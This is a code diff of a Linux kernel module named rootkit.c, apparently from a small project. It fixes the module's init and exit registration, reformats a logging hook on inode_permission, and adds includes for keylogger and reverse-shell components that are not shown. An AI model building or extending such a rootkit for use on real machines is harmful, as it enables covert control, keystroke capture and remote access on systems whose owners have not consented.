@@ -1,22 +1,22 @@
 /**
- * @file	rootkit.c
- * @author	Aaron Lichtman, Arch Gupta  and Brandon Weidner
- * @brief	A rootkit. TODO: Expand description
+ * @file    rootkit.c
+ * @author  Aaron Lichtman, Arch Gupta  and Brandon Weidner
+ * @brief   A rootkit. TODO: Expand description
  */
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/file.h>
+#include <linux/fs.h>
 #include "khook/engine.c"
+#include "arsenal/keylogger.c"
+#include "arsenal/reverse-shell.c"
 
-//#include <linux/mutex.h> // Will likely need this for handling interrupts.
-
-MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Aaron Lichtman");
 MODULE_AUTHOR("Arch Gupta");
 MODULE_AUTHOR("Brandon Weidner");
 MODULE_DESCRIPTION("Linux rootkit.");
 MODULE_VERSION("0.1");
+MODULE_LICENSE("GPL");
 
 // Look into module_param() and MODULE_PARM_DESC for adding parameters
 
@@ -43,33 +43,32 @@ static int khook_fget(unsigned int fd) {
 }
 **/
 
+// Example hook for testing build process.
 KHOOK(inode_permission);
-static int khook_inode_permission(struct inode *inode, int mask)
-{
-    int ret = 0;
-    ret = KHOOK_ORIGIN(inode_permission, inode, mask);
-    printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
-    return ret;
+static int khook_inode_permission(struct inode* inode, int mask) {
+	int ret = 0;
+	ret = KHOOK_ORIGIN(inode_permission, inode, mask);
+	printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
+	return ret;
 }
 
 
 /**
  * Rootkit module initialization.
  */
-static int rootkit_init(void) {
-    printk(KERN_INFO "Initializing rootkit.\n");
-    khook_init();
-    return 0;
+static int __init rootkit_init(void) {
+	printk(KERN_INFO "Initializing rootkit.\n");
+	khook_init();
+	return 0;
 }
 
 /**
  * Called at exit. All cleanup should be done here.
  */
-static int rootkit_exit(void) {
-    printk(KERN_INFO "Cleaning up rootkit.\n");
-    khook_cleanup();
-    return 0;
+static void __exit rootkit_exit(void) {
+	printk(KERN_INFO "Cleaning up rootkit.\n");
+	khook_cleanup();
 }
 
 module_init(rootkit_init);
-module_init(rootkit_exit);
+module_exit(rootkit_exit);
